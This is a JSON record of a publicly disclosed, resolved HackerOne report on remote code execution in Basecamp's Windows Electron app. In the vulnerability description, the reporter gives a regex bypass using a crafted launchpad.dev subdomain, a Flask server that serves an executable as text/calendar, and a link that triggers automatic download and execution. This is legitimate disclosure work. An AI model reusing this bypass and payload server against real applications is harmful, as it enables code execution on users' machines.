{
  "id": 1016966,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDE2OTY2",
  "url": "https://hackerone.com/reports/1016966",
  "title": "Remote Code Execution in Basecamp Windows Electron App",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-10-23T11:30:45.327Z",
  "submitted_at": "2020-10-23T11:30:45.346Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "co0sin",
    "url": "/co0sin",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/xUxKzbdhbP6x9uFXLyB2PusT/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 67,
    "url": "https://hackerone.com/basecamp",
    "handle": "basecamp",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Basecamp",
      "twitter_handle": "basecamp",
      "website": "https://basecamp.com/about/policies/security/response",
      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-11-19T21:24:55.782Z",
  "bug_reporter_agreed_on_going_public_at": "2020-11-19T21:24:55.709Z",
  "team_member_agreed_on_going_public_at": "2020-11-19T18:23:25.324Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The Windows application for Basecamp, allows a \"Download\" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.\n\nI was able to craft a link, which when clicked by a user, will be downloaded and executed! \n\nTo get file execution on the user, we bypass the restrictions first:\nThere is a regular expression which checks for \"internal domains\", which can easily be bypassed by controlling the subdomain. The host pattern is `/(launchpad\\.37signals\\.com|launchpad\\.(?:dev|test))/` and `/(3\\.(?:staging\\.)?basecamp\\.com|bc3\\.(?:dev|test))/`. By controlling the subdomain, and setting it to something like `launchpad.dev.mydomain.com`, we can bypass this regular expression verification.\n\nSince we'll be sending the request to our own server, we simply need to return `text/calendar` as the content-type header. This can be seen in the Electron code in `OPENABLE_MIME_TYPES = new Set([\"text/calendar\"]);`\nAnd then when adding the URL to your post, simply add the `?attachment=true` to the URL. \n\n\nTo reproduce, simply register any subdomain that starts with `launchpad.dev.` (mine is `launchpad.dev.████`).\nAn HTTP server with the needed mimetype header, can be setup with Flask easily with this code:\n```\nfrom flask import Flask, send_from_directory\napp = Flask(__name__)\n@app.route('/<path:path>')\ndef hello(path):\n    return send_from_directory(\".\", \"file.exe\", as_attachment=True, mimetype=\"text/calendar\")\nif __name__ == '__main__':\n    app.run(port=80,host=\"0.0.0.0\")\n```\n\nThen add the link to your post with the appropriate `attachment` parameter, as such:\n`http://launchpad.dev.█████████/file.exe?attachment=true`\n\n## Impact\n\nRemote code execution on any user which clicks a link on your crafted post through the desktop app.",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-12-19T18:23:25.448Z",
  "allow_singular_disclosure_after": -99430449.53395067,
  "singular_disclosure_allowed": true,
  "vote_count": 45,
  "voters": [
    "oussamaka",
    "daviey",
    "carbon61",
    "xploiterr",
    "mashoud1122",
    "fqdn",
    "bibekshah",
    "ali",
    "mik317",
    "0xelkomy",
    "and 35 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 4657,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "basecamp3.exe",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
